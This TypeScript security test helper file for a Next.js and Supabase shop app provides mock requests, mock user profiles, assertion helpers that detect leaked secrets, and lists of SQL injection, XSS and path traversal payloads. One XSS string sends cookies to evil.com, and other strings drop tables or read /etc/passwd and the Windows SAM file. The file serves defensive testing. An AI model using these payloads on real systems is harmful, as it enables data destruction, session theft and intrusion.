/**
 * Security Test Helpers
 *
 * Shared utilities for security testing including:
 * - Mock request creation
 * - Common injection payloads
 * - Security assertion helpers
 */

import type { NextRequest } from "next/server";
import { vi } from "vitest";

// ============================================================================
// SENSITIVE KEYS - Should NEVER be exposed to client
// ============================================================================

export const SENSITIVE_ENV_KEYS = [
  "SUPABASE_SECRET_KEY",
  "SUPABASE_SERVICE_ROLE_KEY",
  "DATABASE_URL",
  "SESSION_SECRET",
  "ADMIN_PASSWORD",
  "API_SECRET",
  "JWT_SECRET",
] as const;

// Keys that are safe to expose to client
export const ALLOWED_CLIENT_ENV_KEYS = [
  "NEXT_PUBLIC_SUPABASE_URL",
  "NEXT_PUBLIC_SUPABASE_PUBLISHABLE_OR_ANON_KEY",
] as const;

// ============================================================================
// SQL INJECTION PAYLOADS
// ============================================================================

export const SQL_INJECTION_PAYLOADS = [
  // Classic SQL injection
  "'; DROP TABLE users; --",
  "1' OR '1'='1",
  "admin'--",
  "1; DELETE FROM products WHERE 1=1",
  "' UNION SELECT * FROM users --",
  // Blind SQL injection
  "1' AND SLEEP(5)--",
  "1' AND 1=1--",
  "1' AND 1=2--",
  // Numeric injection
  "1 OR 1=1",
  "-1 OR 1=1",
  // Comment injection
  "admin'/*",
  "*/DROP TABLE users/*",
] as const;

// ============================================================================
// XSS PAYLOADS
// ============================================================================

export const XSS_PAYLOADS = [
  // Script tags
  '<script>alert("xss")</script>',
  "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
  // Event handlers
  "<img src=x onerror=alert(1)>",
  "<svg onload=alert(1)>",
  "<body onload=alert(1)>",
  // JavaScript protocol
  "javascript:alert(1)",
  "javascript:alert(document.domain)",
  // Data URLs
  "data:text/html,<script>alert(1)</script>",
  // Encoded payloads
  "&lt;script&gt;alert(1)&lt;/script&gt;",
  "&#60;script&#62;alert(1)&#60;/script&#62;",
] as const;

// ============================================================================
// PATH TRAVERSAL PAYLOADS
// ============================================================================

export const PATH_TRAVERSAL_PAYLOADS = [
  "../../../etc/passwd",
  "..\\..\\..\\windows\\system32\\config\\sam",
  "....//....//....//etc/passwd",
  "/etc/passwd%00.jpg",
  "..%2f..%2f..%2fetc%2fpasswd",
] as const;

// ============================================================================
// MOCK REQUEST HELPERS
// ============================================================================

export function createMockRequest(
  options: {
    method?: string;
    url?: string;
    headers?: Record<string, string>;
    body?: unknown;
    cookies?: Record<string, string>;
  } = {},
): NextRequest {
  const {
    method = "GET",
    url = "http://localhost:3000",
    headers = {},
    body,
    cookies = {},
  } = options;

  const cookieString = Object.entries(cookies)
    .map(([key, value]) => `${key}=${value}`)
    .join("; ");

  const requestHeaders = new Headers(headers);
  if (cookieString) {
    requestHeaders.set("Cookie", cookieString);
  }

  const requestInit: RequestInit = {
    method,
    headers: requestHeaders,
  };

  if (body && method !== "GET") {
    requestInit.body = JSON.stringify(body);
    requestHeaders.set("Content-Type", "application/json");
  }

  return new Request(url, requestInit) as unknown as NextRequest;
}

export function createAuthenticatedRequest(
  options: {
    userId?: string;
    role?: "owner" | "manager" | "staff" | "customer" | "guest";
    method?: string;
    url?: string;
    body?: unknown;
  } = {},
): NextRequest {
  const {
    userId = "test-user-id",
    role = "customer",
    method = "GET",
    url = "http://localhost:3000",
    body,
  } = options;

  // Simulate session cookie (the actual implementation depends on your auth setup)
  return createMockRequest({
    method,
    url,
    body,
    cookies: {
      admin_session: `mock-token-${userId}-${role}`,
    },
  });
}

export function createGuestRequest(
  guestId: string,
  options: {
    method?: string;
    url?: string;
    body?: unknown;
  } = {},
): NextRequest {
  const { method = "GET", url = "http://localhost:3000", body } = options;

  return createMockRequest({
    method,
    url,
    body,
    headers: {
      "x-guest-id": guestId,
    },
  });
}

// ============================================================================
// MOCK USER PROFILES
// ============================================================================

export const MOCK_PROFILES = {
  owner: {
    id: "owner-profile-id",
    username: "owner",
    role: "owner" as const,
    fullName: "Shop Owner",
    isActive: true,
  },
  admin: {
    id: "admin-profile-id",
    username: "admin",
    // Represent the top-level internal admin as owner role
    role: "owner" as const,
    fullName: "Admin User",
    isActive: true,
  },
  manager: {
    id: "manager-profile-id",
    username: "manager",
    role: "manager" as const,
    fullName: "Manager User",
    isActive: true,
  },
  staff: {
    id: "staff-profile-id",
    username: "staff",
    role: "staff" as const,
    fullName: "Staff User",
    isActive: true,
  },
  customer: {
    id: "customer-profile-id",
    username: "customer",
    role: "customer" as const,
    fullName: "Customer User",
    customerCode: "KH001",
    isActive: true,
  },
  guest: {
    id: "guest-profile-id",
    username: "guest",
    role: "guest" as const,
    fullName: "Guest User",
    isActive: true,
  },
  inactive: {
    id: "inactive-profile-id",
    username: "inactive",
    role: "customer" as const,
    fullName: "Inactive User",
    isActive: false,
  },
} as const;

// ============================================================================
// SECURITY ASSERTION HELPERS
// ============================================================================

/**
 * Assert that a string does not contain any sensitive patterns
 */
export function assertNoSensitiveData(content: string, context: string = ""): void {
  const sensitivePatterns = [
    /password/i,
    /secret/i,
    /supabase_service_role/i,
    /supabase_secret/i,
    /database_url/i,
    /postgresql:\/\//i,
    /postgres:\/\//i,
    /jwt_secret/i,
    /api_key/i,
    /private_key/i,
  ];

  for (const pattern of sensitivePatterns) {
    if (pattern.test(content)) {
      throw new Error(
        `Security violation${
          context ? ` in ${context}` : ""
        }: Found sensitive pattern "${pattern}" in content`,
      );
    }
  }
}

/**
 * Assert that error response does not expose internal details
 */
export function assertSafeErrorResponse(error: unknown, context: string = ""): void {
  const errorStr = typeof error === "string" ? error : JSON.stringify(error);

  // Should not contain stack traces
  if (/at\s+\w+\s+\(/.test(errorStr) || /^\s+at\s+/.test(errorStr)) {
    throw new Error(
      `Security violation${context ? ` in ${context}` : ""}: Error contains stack trace`,
    );
  }

  // Should not contain database schema info
  const schemaPatterns = [
    /relation\s+"\w+"\s+does\s+not\s+exist/i,
    /column\s+"\w+"\s+does\s+not\s+exist/i,
    /syntax\s+error\s+at\s+or\s+near/i,
    /pg_catalog/i,
    /information_schema/i,
  ];

  for (const pattern of schemaPatterns) {
    if (pattern.test(errorStr)) {
      throw new Error(
        `Security violation${context ? ` in ${context}` : ""}: Error exposes database schema info`,
      );
    }
  }

  assertNoSensitiveData(errorStr, context);
}

/**
 * Assert that a response object does not contain sensitive fields
 */
export function assertNoSensitiveFields(obj: Record<string, unknown>, context: string = ""): void {
  const sensitiveFields = [
    "password",
    "passwordHash",
    "hashedPassword",
    "secret",
    "secretKey",
    "privateKey",
    "accessToken",
    "refreshToken",
    "apiKey",
  ];

  for (const field of sensitiveFields) {
    if (field in obj) {
      throw new Error(
        `Security violation${
          context ? ` in ${context}` : ""
        }: Response contains sensitive field "${field}"`,
      );
    }
  }
}

// ============================================================================
// MOCK SUPABASE HELPERS
// ============================================================================

/**
 * Create a mock Supabase client for testing different auth scenarios
 */
export function createMockSupabaseClient(scenario: "authenticated" | "unauthenticated" | "error") {
  const mockUser =
    scenario === "authenticated" ? { id: "test-user-id", email: "test@example.com" } : null;

  return {
    auth: {
      getUser: vi.fn().mockResolvedValue({
        data: { user: mockUser },
        error: scenario === "error" ? new Error("Auth error") : null,
      }),
      getSession: vi.fn().mockResolvedValue({
        data: { session: mockUser ? { user: mockUser } : null },
        error: null,
      }),
    },
  };
}

// ============================================================================
// RATE LIMITING HELPERS
// ============================================================================

/**
 * Simulate multiple rapid requests for rate limiting tests
 */
export async function simulateRapidRequests(
  requestFn: () => Promise<Response>,
  count: number = 100,
  delayMs: number = 10,
): Promise<Response[]> {
  const responses: Response[] = [];

  for (let i = 0; i < count; i++) {
    responses.push(await requestFn());
    if (delayMs > 0) {
      await new Promise((resolve) => setTimeout(resolve, delayMs));
    }
  }

  return responses;
}
